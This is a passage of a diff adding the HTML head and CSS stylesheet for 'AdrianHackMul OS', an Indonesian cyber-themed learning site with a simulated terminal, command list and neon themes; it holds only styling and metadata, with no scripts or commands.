@@ -1,0 +1,3050 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#00ff41">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="AdrianHackMul">
+<meta name="description" content="AdrianHackMul OS — ruang belajar interaktif bertema cyber, terminal simulasi, dan alat edukasi teknologi.">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta property="og:type" content="website">
+<meta property="og:title" content="AdrianHackMul OS | Cyber Learning">
+<meta property="og:description" content="Jelajahi terminal simulasi dan alat pembelajaran teknologi dengan tema cyber neon.">
+<link rel="icon" href="https://i.ibb.co.com/BH8W8pZ1/cbf7eab0d8f4207ca73e71d69d670f95.jpg">
+<link rel="apple-touch-icon" href="https://i.ibb.co.com/BH8W8pZ1/cbf7eab0d8f4207ca73e71d69d670f95.jpg">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&family=Orbitron:wght@600;700;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{--bg:#04060a;--panel:#0a0e14;--border:#1a2332;--primary:#00ff41;--accent:#00d9ff;--danger:#ff0040;--warning:#ffaa00;--text:#c9d1d9;--dim:#6e7681;--glow:rgba(0,255,65,.5);--soft:rgba(0,255,65,.1);--grad:linear-gradient(90deg,#00ff41,#00d9ff)}
+[data-theme="red"]{--primary:#ff2b2b;--accent:#ff6b6b;--glow:rgba(255,43,43,.5);--soft:rgba(255,43,43,.1);--grad:linear-gradient(90deg,#ff2b2b,#ff6b6b)}
+[data-theme="blue"]{--primary:#00d9ff;--accent:#0088ff;--glow:rgba(0,217,255,.5);--soft:rgba(0,217,255,.1);--grad:linear-gradient(90deg,#00d9ff,#0088ff)}
+[data-theme="amber"]{--primary:#ffb000;--accent:#ff7700;--glow:rgba(255,176,0,.5);--soft:rgba(255,176,0,.1);--grad:linear-gradient(90deg,#ffb000,#ff7700)}
+[data-theme="purple"]{--primary:#b547ff;--accent:#ff47d1;--glow:rgba(181,71,255,.5);--soft:rgba(181,71,255,.1);--grad:linear-gradient(90deg,#b547ff,#ff47d1)}
+[data-theme="pink"]{--primary:#ff3d9a;--accent:#ff85c1;--glow:rgba(255,61,154,.5);--soft:rgba(255,61,154,.1);--grad:linear-gradient(90deg,#ff3d9a,#ff85c1)}
+html,body{width:100%;min-height:100%;background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;line-height:1.6;overflow-x:hidden}
+body{position:relative}
+body.locked{overflow:hidden}
+#matrix{position:fixed;inset:0;z-index:0;opacity:.5;pointer-events:none}
+body.matrix-off #matrix{opacity:0}
+.fx-noise{position:fixed;inset:0;z-index:1;pointer-events:none;opacity:.03;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");animation:noise .4s steps(2) infinite}
+@keyframes noise{0%{transform:translate(0,0)}25%{transform:translate(-2%,2%)}50%{transform:translate(2%,-2%)}75%{transform:translate(-1%,-1%)}100%{transform:translate(1%,1%)}}
+.scanlines{position:fixed;inset:0;z-index:1;pointer-events:none;background:repeating-linear-gradient(0deg,rgba(0,0,0,.12) 0,rgba(0,0,0,.12) 1px,transparent 1px,transparent 3px)}
+.orb{position:fixed;border-radius:50%;filter:blur(100px);opacity:.3;pointer-events:none;z-index:0}
+.orb.o1{width:400px;height:400px;background:var(--primary);top:-100px;left:-100px;animation:float 15s ease-in-out infinite}
+.orb.o2{width:350px;height:350px;background:var(--accent);bottom:-100px;right:-100px;animation:float 18s ease-in-out infinite reverse}
+@keyframes float{50%{transform:translate(60px,40px) scale(1.1)}}
+
+/* LOADER */
+#loader{position:fixed;inset:0;background:radial-gradient(circle at center,#05101a,#000);z-index:9000;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:24px;padding:20px;transition:opacity .6s,visibility .6s}
+#loader.hide{opacity:0;visibility:hidden;pointer-events:none}
+.load-ring{position:relative;width:min(170px,42vw);aspect-ratio:1;display:flex;align-items:center;justify-content:center}
+.load-ring::before,.load-ring::after{content:'';position:absolute;border-radius:50%;border:2px solid transparent}
+.load-ring::before{inset:0;border-top-color:var(--primary);border-right-color:var(--primary);box-shadow:0 0 24px var(--glow);animation:spin 1.5s linear infinite}
+.load-ring::after{inset:12%;border-bottom-color:var(--accent);border-left-color:var(--accent);box-shadow:0 0 18px rgba(0,217,255,.5);animation:spin 1s linear infinite reverse}
+@keyframes spin{to{transform:rotate(360deg)}}
+.load-pulse{position:absolute;inset:20%;border-radius:50%;background:radial-gradient(circle,var(--soft),transparent 70%);animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{transform:scale(.85);opacity:.5}50%{transform:scale(1.15);opacity:1}}
+.load-img{width:56%;aspect-ratio:1;object-fit:cover;border-radius:50%;border:2px solid var(--primary);box-shadow:0 0 30px var(--glow);z-index:2}
+.load-name{font-family:'Orbitron',monospace;font-weight:900;font-size:clamp(18px,4vw,30px);letter-spacing:6px;background:var(--grad);background-size:200% auto;-webkit-background-clip:text;background-clip:text;color:transparent;animation:shine 3s linear infinite;text-align:center}
+@keyframes shine{to{background-position:200% center}}
+.load-bar{width:min(320px,80vw);height:5px;background:#0a0e14;border:1px solid var(--border);border-radius:3px;overflow:hidden}
+.load-fill{height:100%;width:0;background:var(--grad);box-shadow:0 0 15px var(--glow);transition:width .2s linear}
+.load-stat{color:var(--primary);font-size:11px;letter-spacing:3px;text-align:center;min-height:16px;text-shadow:0 0 8px var(--glow)}
+.blink{animation:blink 1s infinite}@keyframes blink{50%{opacity:0}}
+
+/* HEADER */
+header{position:fixed;top:0;left:0;right:0;height:56px;z-index:5000;background:rgba(4,6,10,.95);backdrop-filter:blur(16px);-webkit-backdrop-filter:blur(16px);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 14px;gap:14px;padding-top:env(safe-area-inset-top,0px);height:calc(56px + env(safe-area-inset-top,0px))}
+#burger{width:42px;height:42px;background:transparent;border:1px solid var(--primary);border-radius:8px;cursor:pointer;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:5px;padding:0;transition:.3s;flex-shrink:0;box-shadow:0 0 10px var(--soft)}
+#burger:hover{background:var(--soft);box-shadow:0 0 18px var(--glow)}
+#burger span{display:block;width:22px;height:2px;background:var(--primary);border-radius:2px;transition:.3s;box-shadow:0 0 6px var(--glow)}
+#burger.open span:nth-child(1){transform:rotate(45deg) translate(5px,5px)}
+#burger.open span:nth-child(2){opacity:0}
+#burger.open span:nth-child(3){transform:rotate(-45deg) translate(5px,-5px)}
+.hd-brand{display:flex;align-items:center;gap:10px;flex:1;min-width:0}
+.hd-brand img{width:36px;height:36px;border-radius:50%;border:2px solid var(--primary);box-shadow:0 0 12px var(--glow);object-fit:cover;flex-shrink:0}
+.hd-brand span{font-family:'Orbitron',monospace;font-weight:900;font-size:15px;letter-spacing:2px;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.hd-right{display:flex;gap:8px;align-items:center;flex-shrink:0}
+.hd-right select,.hd-right button{background:rgba(10,14,20,.8);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:inherit;font-size:11px;border-radius:6px;cursor:pointer;transition:.2s}
+.hd-right select:hover,.hd-right button:hover{border-color:var(--primary);color:var(--primary)}
+.hd-right button.active{background:var(--soft);color:var(--primary);border-color:var(--primary)}
+#installBtn{background:var(--soft);color:var(--primary);border-color:var(--primary);display:none}
+#installBtn.show{display:block}
+
+/* DRAWER */
+#overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);backdrop-filter:blur(3px);z-index:5100;opacity:0;visibility:hidden;transition:.3s}
+#overlay.show{opacity:1;visibility:visible}
+#drawer{position:fixed;top:0;left:0;bottom:0;width:290px;max-width:85vw;background:linear-gradient(180deg,rgba(6,12,18,.98),rgba(2,6,10,.98));backdrop-filter:blur(20px);border-right:1px solid var(--primary);z-index:5200;transform:translateX(-100%);transition:transform .35s cubic-bezier(.4,0,.2,1);overflow-y:auto;box-shadow:4px 0 40px rgba(0,0,0,.6)}
+#drawer.open{transform:translateX(0)}
+#drawer::-webkit-scrollbar{width:5px}#drawer::-webkit-scrollbar-thumb{background:var(--primary);border-radius:3px}
+.drawer-head{padding:20px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px}
+.drawer-head img{width:52px;height:52px;border-radius:50%;border:2px solid var(--primary);box-shadow:0 0 18px var(--glow);object-fit:cover}
+.drawer-head .info{flex:1;min-width:0}
+.drawer-head .info .t{font-family:'Orbitron',monospace;font-size:14px;font-weight:900;letter-spacing:1px;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;margin-bottom:2px}
+.drawer-head .info .s{font-size:10px;color:var(--primary);letter-spacing:2px;display:flex;align-items:center;gap:5px}
+.drawer-head .info .s::before{content:'';width:6px;height:6px;background:var(--primary);border-radius:50%;box-shadow:0 0 8px var(--primary);animation:blink 1.5s infinite}
+.drawer-section{padding:12px 20px 6px;font-size:9px;color:var(--dim);letter-spacing:3px;text-transform:uppercase;font-weight:700;opacity:.7}
+.drawer-nav{padding:0 10px 8px;display:flex;flex-direction:column;gap:2px}
+.dnav{display:flex;align-items:center;gap:12px;padding:11px 14px;color:var(--dim);border-radius:8px;cursor:pointer;transition:.2s;font-size:12px;letter-spacing:1px;border-left:3px solid transparent}
+.dnav:hover{color:var(--primary);background:var(--soft);border-left-color:var(--primary)}
+.dnav.active{color:var(--primary);background:var(--soft);border-left-color:var(--primary);font-weight:700;text-shadow:0 0 8px var(--glow)}
+.dnav .ic{font-size:16px;width:22px;text-align:center}
+.dnav .lb{flex:1}
+.dnav .bg{font-size:9px;padding:2px 7px;background:var(--soft);color:var(--primary);border-radius:10px;border:1px solid rgba(0,255,65,.3);letter-spacing:1px}
+.drawer-foot{padding:16px 20px;border-top:1px solid var(--border);margin-top:10px;font-size:10px;color:var(--dim);text-align:center}
+.drawer-foot b{color:var(--primary)}
+
+/* MAIN */
+main{position:relative;z-index:2;margin-top:calc(56px + env(safe-area-inset-top,0px));min-height:calc(100vh - 56px - env(safe-area-inset-top,0px));padding-bottom:40px}
+.page{display:none;max-width:1400px;margin:0 auto;padding:30px 20px;animation:pageIn .35s ease-out}
+.page.active{display:block}
+@keyframes pageIn{from{opacity:0;transform:translateY(15px)}to{opacity:1;transform:none}}
+.sec-title{font-family:'Orbitron',monospace;font-size:clamp(20px,3vw,28px);color:var(--primary);text-shadow:0 0 14px var(--glow);margin-bottom:6px;letter-spacing:2px}
+.sec-title::before{content:'> ';color:var(--accent)}
+.sec-sub{color:var(--dim);font-size:11px;margin-bottom:26px;letter-spacing:1px}
+.panel{background:linear-gradient(135deg,rgba(10,14,20,.9),rgba(5,10,15,.9));border:1px solid var(--border);border-radius:12px;padding:18px;position:relative;overflow:hidden}
+.panel::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--grad);opacity:.6}
+.panel-title{color:var(--primary);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin-bottom:14px;border-bottom:1px solid var(--border);padding-bottom:10px;display:flex;justify-content:space-between;align-items:center;font-weight:700}
+
+/* HERO */
+.hero-wrap{text-align:center;padding:40px 20px 20px}
+.hero-logo{width:min(140px,32vw);aspect-ratio:1;object-fit:cover;border-radius:50%;border:3px solid var(--primary);box-shadow:0 0 40px var(--glow),0 0 80px var(--soft);margin:0 auto 24px;display:block;animation:heroFloat 4s ease-in-out infinite}
+@keyframes heroFloat{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
+.hero-title{font-family:'Orbitron',monospace;font-size:clamp(32px,7.5vw,72px);font-weight:900;letter-spacing:3px;background:var(--grad);background-size:200% auto;-webkit-background-clip:text;background-clip:text;color:transparent;animation:shine 4s linear infinite;filter:drop-shadow(0 0 20px var(--glow));margin-bottom:12px}
+.hero-sub{color:var(--accent);letter-spacing:5px;font-size:clamp(10px,2.5vw,12px);text-transform:uppercase;margin-bottom:28px}
+.hero-btns{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-bottom:30px}
+.btn{padding:12px 26px;border:1px solid var(--primary);background:rgba(0,0,0,.5);color:var(--primary);font-family:'Orbitron',monospace;font-size:11px;font-weight:700;letter-spacing:2px;cursor:pointer;transition:.25s;text-transform:uppercase;border-radius:8px}
+.btn:hover{background:var(--soft);box-shadow:0 0 24px var(--glow);transform:translateY(-2px)}
+.btn.alt{border-color:var(--accent);color:var(--accent)}
+.status{display:flex;gap:14px;justify-content:center;flex-wrap:wrap;padding:14px 20px;border:1px solid var(--border);background:rgba(10,14,20,.7);border-radius:10px;font-size:11px;max-width:900px;margin:0 auto}
+.status span{color:var(--dim)}
+.status b{color:var(--primary);text-shadow:0 0 6px var(--glow)}
+.quick-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:14px;margin-top:34px;max-width:900px;margin-left:auto;margin-right:auto}
+.quick-card{background:linear-gradient(135deg,rgba(10,14,20,.9),rgba(5,10,15,.9));border:1px solid var(--border);border-radius:12px;padding:18px 14px;text-align:center;cursor:pointer;transition:.3s}
+.quick-card:hover{border-color:var(--primary);transform:translateY(-6px);box-shadow:0 12px 30px var(--soft)}
+.quick-card .ic{font-size:28px;margin-bottom:8px}
+.quick-card .nm{font-family:'Orbitron',monospace;font-size:11px;letter-spacing:1.5px;color:var(--primary)}
+.quick-card .ds{font-size:10px;color:var(--dim);margin-top:4px}
+
+/* STATS */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px;margin-bottom:20px}
+.stat{background:linear-gradient(135deg,rgba(10,14,20,.9),rgba(5,10,15,.9));border:1px solid var(--border);border-radius:12px;padding:16px;transition:.3s;position:relative;overflow:hidden}
+.stat::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:var(--grad);opacity:.7}
+.stat:hover{border-color:var(--primary);transform:translateY(-3px);box-shadow:0 0 24px var(--soft)}
+.stat-l{font-size:10px;color:var(--dim);letter-spacing:2px;text-transform:uppercase}
+.stat-v{font-family:'Orbitron',monospace;font-size:24px;font-weight:700;color:var(--primary);text-shadow:0 0 12px var(--glow);margin:6px 0}
+.stat-d{font-size:10px;color:var(--accent)}
+.bar{height:3px;background:#111;margin-top:8px;border-radius:2px;overflow:hidden}
+.bar>div{height:100%;background:var(--grad);width:0;transition:width 1s}
+.charts{display:grid;grid-template-columns:2fr 1fr;gap:16px;margin-bottom:20px}
+@media(max-width:900px){.charts{grid-template-columns:1fr}}
+.chart-panel{background:linear-gradient(135deg,rgba(10,14,20,.9),rgba(5,10,15,.9));border:1px solid var(--border);border-radius:12px;padding:16px}
+.chart-panel canvas{width:100%;display:block}
+.log{background:#000;border:1px solid var(--border);border-radius:12px;padding:14px;height:200px;overflow-y:auto;font-size:11px;line-height:1.7}
+.log::-webkit-scrollbar{width:6px}.log::-webkit-scrollbar-thumb{background:var(--primary);border-radius:3px}
+.line{color:var(--dim);animation:fadeIn .3s}
+.line .ok{color:var(--primary)}.line .warn{color:var(--warning)}.line .err{color:var(--danger)}
+@keyframes fadeIn{from{opacity:0;transform:translateX(-6px)}to{opacity:1;transform:none}}
+
+/* TERMINAL */
+.term{background:#000;border:1px solid var(--primary);border-radius:12px;overflow:hidden;box-shadow:0 0 40px var(--soft);max-width:1000px;margin:0 auto;position:relative}
+.term-h{background:linear-gradient(180deg,#1a1f2b,#0d1117);padding:10px 14px;display:flex;align-items:center;gap:8px;border-bottom:1px solid var(--border)}
+.dot{width:12px;height:12px;border-radius:50%}
+.dot.r{background:#ff5f56}.dot.y{background:#ffbd2e}.dot.g{background:#27c93f}
+.term-t{flex:1;text-align:center;font-size:11px;color:var(--dim);letter-spacing:1px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.term-b{padding:16px;height:540px;overflow-y:auto;font-size:13px;line-height:1.55;position:relative;font-family:'JetBrains Mono',monospace}
+.term-b::-webkit-scrollbar{width:8px}.term-b::-webkit-scrollbar-thumb{background:var(--primary);border-radius:4px}.term-b::-webkit-scrollbar-track{background:#0a0e14}
+.t-line{white-space:pre-wrap;word-break:break-word}
+.t-line.cmd{color:var(--primary)}.t-line.dim{color:var(--dim)}.t-line.err{color:var(--danger)}
+.t-line.ok{color:var(--primary);text-shadow:0 0 4px var(--glow)}.t-line.warn{color:var(--warning)}.t-line.info{color:var(--accent)}
+.t-input-line{display:flex;align-items:center;gap:0;position:relative;margin-top:2px;flex-wrap:nowrap}
+.prompt{color:var(--primary);text-shadow:0 0 6px var(--glow);font-weight:500;font-size:13px;white-space:pre;user-select:none;flex-shrink:0}
+.t-field{flex:1;position:relative;min-height:20px;display:flex;align-items:center;min-width:0;overflow:hidden}
+.t-text{white-space:pre;font-size:13px;color:var(--text);pointer-events:none}
+.t-cursor{display:inline-block;width:8px;height:15px;background:var(--primary);margin-left:1px;box-shadow:0 0 10px var(--primary);animation:tBlink 1.1s steps(2) infinite;flex-shrink:0}
+@keyframes tBlink{50%{opacity:0}}
+#tInput{position:absolute;inset:0;width:100%;background:transparent;border:0;outline:0;color:transparent;caret-color:transparent;font-family:inherit;font-size:13px;z-index:2;padding:0;min-width:0}
+#ac{position:absolute;bottom:100%;left:0;margin-bottom:8px;background:rgba(0,0,0,.98);border:1px solid var(--primary);border-radius:6px;font-size:12px;max-height:240px;overflow-y:auto;min-width:260px;display:none;z-index:10;box-shadow:0 0 24px var(--soft)}
+#ac.show{display:block}
+.ac-i{padding:8px 14px;color:var(--dim);cursor:pointer;display:flex;gap:10px;align-items:center;border-left:3px solid transparent}
+.ac-i:hover,.ac-i.active{background:var(--soft);color:var(--primary);border-left-color:var(--primary)}
+.ac-i b{color:var(--primary);font-weight:700}
+.ac-i .ac-d{color:#666;font-size:10px;margin-left:auto}
+.ac-i .ac-type{color:var(--accent);font-size:9px;padding:1px 6px;border-radius:3px;border:1px solid rgba(0,217,255,.3);flex-shrink:0}
+.fs-dir{color:var(--accent);font-weight:700}
+.fs-exec{color:var(--primary);font-weight:700}
+.fs-hidden{color:var(--dim)}
+#nanoEditor{position:absolute;inset:40px 0 0 0;background:#000;z-index:5;display:none;flex-direction:column}
+#nanoEditor.show{display:flex}
+.nano-head{background:linear-gradient(180deg,#0d1117,#1a1f2b);padding:6px 12px;color:var(--primary);font-size:11px;border-bottom:1px solid var(--border)}
+.nano-body{flex:1;padding:14px;overflow:auto;background:#000}
+.nano-body textarea{width:100%;height:100%;background:transparent;border:0;outline:0;color:var(--text);font-family:inherit;font-size:13px;resize:none;line-height:1.5;min-height:300px}
+.nano-foot{background:linear-gradient(180deg,#0d1117,#1a1f2b);padding:6px 12px;color:var(--dim);font-size:10px;border-top:1px solid var(--border);display:flex;gap:14px;flex-wrap:wrap}
+.nano-foot b{color:var(--primary)}
+
+/* TOOLS */
+.tools{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:14px}
+.tool{background:linear-gradient(135deg,rgba(10,14,20,.9),rgba(5,10,15,.9));border:1px solid var(--border);border-radius:12px;padding:20px;cursor:pointer;transition:.3s}
+.tool:hover{border-color:var(--primary);transform:translateY(-5px);box-shadow:0 12px 32px var(--soft)}
+.tool-i{font-size:26px;margin-bottom:10px}
+.tool-n{color:var(--primary);font-weight:700;font-size:13px;margin-bottom:6px;font-family:'Orbitron',monospace;letter-spacing:1px}
+.tool-d{color:var(--dim);font-size:11px}
+
+/* LEARN */
+.learn-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
+.learn-card{background:linear-gradient(135deg,rgba(10,14,20,.9),rgba(5,10,15,.9));border:1px solid var(--border);border-radius:12px;padding:20px;cursor:pointer;transition:.3s;position:relative;overflow:hidden}
+.learn-card::before{content:'';position:absolute;top:0;left:0;width:4px;height:100%;background:var(--grad);opacity:.6}
+.learn-card:hover{border-color:var(--primary);transform:translateY(-4px);box-shadow:0 12px 32px var(--soft)}
+.learn-icon{font-size:30px;margin-bottom:12px}
+.learn-title{color:var(--primary);font-family:'Orbitron',monospace;font-size:14px;font-weight:700;letter-spacing:1px;margin-bottom:8px}
+.learn-desc{color:var(--dim);font-size:11px;line-height:1.5;margin-bottom:12px}
+.learn-level{display:inline-block;padding:3px 9px;border-radius:5px;font-size:9px;letter-spacing:1px;font-weight:700}
+.level-beginner{background:rgba(0,255,65,.15);color:var(--primary);border:1px solid var(--primary)}
+.level-intermediate{background:rgba(255,170,0,.15);color:var(--warning);border:1px solid var(--warning)}
+.level-advanced{background:rgba(255,0,64,.15);color:var(--danger);border:1px solid var(--danger)}
+
+/* BOOK */
+.book-wrap{max-width:820px;margin:0 auto;color:#ffffff;font-size:13px;line-height:1.75}
+.book-wrap h1{font-family:'Orbitron',monospace;font-size:clamp(20px,4vw,28px);color:#ffffff;text-align:center;margin-bottom:8px;letter-spacing:2px}
+.book-wrap .book-sub{text-align:center;color:#ffffff;opacity:.75;font-size:12px;margin-bottom:28px;font-style:italic}
+.book-wrap h2{font-family:'Orbitron',monospace;font-size:16px;color:#ffffff;margin:32px 0 12px;padding-bottom:8px;border-bottom:1px solid rgba(255,255,255,.2);letter-spacing:1px}
+.book-wrap h3{font-size:14px;color:#ffffff;margin:20px 0 8px;font-weight:700}
+.book-wrap p{color:#ffffff;margin-bottom:12px}
+.book-wrap ul,.book-wrap ol{margin:10px 0 14px 22px;color:#ffffff}
+.book-wrap li{margin-bottom:6px;color:#ffffff}
+.book-wrap strong,.book-wrap b{color:#ffffff;font-weight:700}
+.book-wrap em{color:#ffffff;font-style:italic}
+.book-wrap .book-note{border-left:3px solid rgba(255,255,255,.4);padding:10px 14px;background:rgba(255,255,255,.05);margin:16px 0;font-size:12px;color:#ffffff}
+.book-wrap code{background:rgba(255,255,255,.08);color:#ffffff;padding:2px 6px;border-radius:4px;font-size:12px}
+.book-toc{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.15);border-radius:10px;padding:18px 22px;margin-bottom:28px}
+.book-toc ol{margin:0 0 0 18px}
+.book-toc li{margin-bottom:4px}
+
+/* GALLERY FLOATING FRAMES */
+.g-item{width:100%;aspect-ratio:1/1;height:auto;min-width:0;border-radius:12px;overflow:hidden;border:2px solid rgba(255,255,255,.18);box-shadow:0 8px 24px rgba(0,0,0,.45),0 0 12px rgba(0,255,65,.12);cursor:pointer;transition:transform .3s,box-shadow .3s;background:#0a0e14;position:relative}
+.g-item:hover{transform:translateY(-8px) scale(1.04);box-shadow:0 14px 32px rgba(0,0,0,.55),0 0 20px rgba(0,255,65,.25);border-color:var(--primary)}
+.g-item img{width:100%;height:100%;object-fit:cover;display:block;pointer-events:none}
+.g-item::after{content:'🔍';position:absolute;bottom:6px;right:6px;font-size:11px;background:rgba(0,0,0,.65);padding:2px 5px;border-radius:4px;opacity:.7}
+
+/* LIGHTBOX */
+#lightbox{position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:9000;display:none;align-items:center;justify-content:center;padding:20px;cursor:zoom-out}
+#lightbox.show{display:flex}
+#lightboxImg{max-width:92vw;max-height:88vh;border-radius:10px;border:2px solid var(--primary);box-shadow:0 0 40px var(--glow);object-fit:contain}
+#lightboxClose{position:absolute;top:16px;right:16px;width:40px;height:40px;border-radius:8px;border:1px solid var(--danger);background:rgba(0,0,0,.7);color:var(--danger);font-size:18px;cursor:pointer;z-index:9001}
+#lightboxClose:hover{background:var(--danger);color:#000}
+
+/* LINK CARDS */
+.link-card{display:flex;align-items:center;gap:14px;padding:14px 16px;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.12);border-radius:10px;text-decoration:none;transition:.25s;color:#ffffff}
+.link-card:hover{border-color:var(--primary);background:rgba(0,255,65,.06);transform:translateX(4px);box-shadow:0 0 16px rgba(0,255,65,.12)}
+.link-icon{font-size:22px;width:36px;text-align:center;flex-shrink:0}
+.link-title{font-size:13px;font-weight:700;color:#ffffff;margin-bottom:2px}
+.link-url{font-size:11px;color:rgba(255,255,255,.55)}
+
+/* MODAL */
+#modal{position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:8000;display:none;align-items:center;justify-content:center;padding:20px}
+#modal.show{display:flex}
+.modal-box{background:#000;border:2px solid var(--primary);border-radius:14px;max-width:820px;width:100%;max-height:88vh;display:flex;flex-direction:column;box-shadow:0 0 70px var(--glow)}
+.modal-head{padding:16px 22px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center}
+.modal-head h3{color:var(--primary);font-family:'Orbitron',monospace;font-size:16px;letter-spacing:2px}
+.modal-close{background:transparent;border:1px solid var(--danger);color:var(--danger);width:32px;height:32px;border-radius:6px;cursor:pointer;font-size:14px}
+.modal-close:hover{background:var(--danger);color:#000}
+.modal-body{padding:22px;overflow-y:auto;flex:1;font-size:12px;line-height:1.7}
+.modal-body h4{color:var(--accent);font-family:'Orbitron',monospace;font-size:13px;margin:18px 0 10px;letter-spacing:1px}
+.modal-body pre{background:#0a0e14;border:1px solid var(--border);padding:14px;border-radius:8px;overflow-x:auto;font-size:11px;margin:10px 0;color:var(--primary);cursor:pointer;white-space:pre-wrap}
+.modal-body pre:hover{border-color:var(--primary)}
+.modal-body code{background:rgba(0,255,65,.1);color:var(--primary);padding:2px 7px;border-radius:4px;font-size:11px}
+.modal-body ul,.modal-body ol{margin:10px 0 10px 22px}
+.modal-body li{margin-bottom:5px}
+.modal-body .tip{border-left:3px solid var(--accent);padding:10px 14px;background:rgba(0,217,255,.05);margin:12px 0;font-size:11px;color:var(--accent)}
+.modal-body .warn{border-left:3px solid var(--warning);padding:10px 14px;background:rgba(255,170,0,.05);margin:12px 0;font-size:11px;color:var(--warning)}
+
+/* COMMANDS */
+.cmd-toolbar{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px;align-items:center}
+.cmd-search{flex:1;min-width:220px;background:#000;border:1px solid var(--border);color:var(--text);padding:12px 16px;font-family:inherit;font-size:13px;border-radius:10px}
+.cmd-search:focus{outline:none;border-color:var(--primary)}
+.cmd-count{color:var(--primary);font-size:11px;letter-spacing:1px;padding:10px 16px;border:1px solid var(--primary);border-radius:10px;background:var(--soft);white-space:nowrap;font-family:'Orbitron',monospace}
+.cmd-cats{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px}
+.cat-btn{background:#000;border:1px solid var(--border);color:var(--dim);padding:6px 12px;font-family:inherit;font-size:11px;cursor:pointer;border-radius:6px;letter-spacing:1px}
+.cat-btn:hover{color:var(--primary);border-color:var(--primary)}
+.cat-btn.active{background:var(--soft);color:var(--primary);border-color:var(--primary)}
+.cmd-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:10px;max-height:620px;overflow-y:auto;padding-right:6px}
+.cmd-list::-webkit-scrollbar{width:8px}.cmd-list::-webkit-scrollbar-thumb{background:var(--primary);border-radius:4px}
+.cmd-item{background:linear-gradient(135deg,rgba(10,14,20,.9),rgba(5,10,15,.9));border:1px solid var(--border);border-radius:8px;padding:12px;position:relative}
+.cmd-item:hover{border-color:var(--primary);box-shadow:0 0 16px var(--soft)}
+.cmd-item .cmd-badge{position:absolute;top:8px;right:8px;font-size:8px;padding:2px 7px;border-radius:4px;background:var(--soft);color:var(--primary);border:1px solid rgba(0,255,65,.3);letter-spacing:1px}
+.cmd-item .cmd-name{color:var(--primary);font-family:'Orbitron',monospace;font-size:12px;font-weight:700;margin-bottom:5px;padding-right:70px;word-break:break-all}
+.cmd-item .cmd-desc{color:var(--text);font-size:11px;line-height:1.5;margin-bottom:8px}
+.cmd-item .cmd-example{background:#000;border:1px solid rgba(0,255,65,.2);padding:7px 10px;border-radius:5px;font-size:10px;color:var(--accent);overflow-x:auto;white-space:nowrap;cursor:pointer}
+.cmd-item .cmd-example:hover{border-color:var(--primary)}
+.cmd-item .cmd-example::before{content:'$ ';color:var(--primary);font-weight:700}
+.cmd-empty{grid-column:1/-1;text-align:center;padding:60px 20px;color:var(--dim);font-size:12px}
+
+/* UTILS */
+.util-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:14px}
+.util-card{background:linear-gradient(135deg,rgba(10,14,20,.9),rgba(5,10,15,.9));border:1px solid var(--border);border-radius:12px;padding:18px}
+.util-card:hover{border-color:var(--primary);box-shadow:0 0 20px var(--soft)}
+.util-head{display:flex;align-items:center;gap:8px;margin-bottom:12px;color:var(--primary);font-family:'Orbitron',monospace;font-size:12px;letter-spacing:1.5px;font-weight:700}
+.util-head .icon{font-size:18px}
+.util-input,.util-output,.util-select,.util-textarea{width:100%;background:#000;border:1px solid var(--border);color:var(--text);padding:10px 12px;font-family:'JetBrains Mono',monospace;font-size:12px;border-radius:6px;resize:vertical}
+.util-input:focus,.util-output:focus,.util-select:focus,.util-textarea:focus{outline:none;border-color:var(--primary)}
+.util-textarea{min-height:70px}
+.util-output{background:rgba(0,255,65,.04);color:var(--accent);border-color:rgba(0,255,65,.25);word-break:break-all;margin-top:8px;cursor:pointer;font-size:11px;line-height:1.7}
+.util-row{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:8px}
+.util-row label{font-size:11px;color:var(--dim);min-width:60px}
+.util-btn{background:transparent;border:1px solid var(--primary);color:var(--primary);padding:8px 14px;font-family:inherit;font-size:11px;border-radius:6px;cursor:pointer;letter-spacing:1px;white-space:nowrap}
+.util-btn:hover{background:var(--soft);box-shadow:0 0 14px var(--glow)}
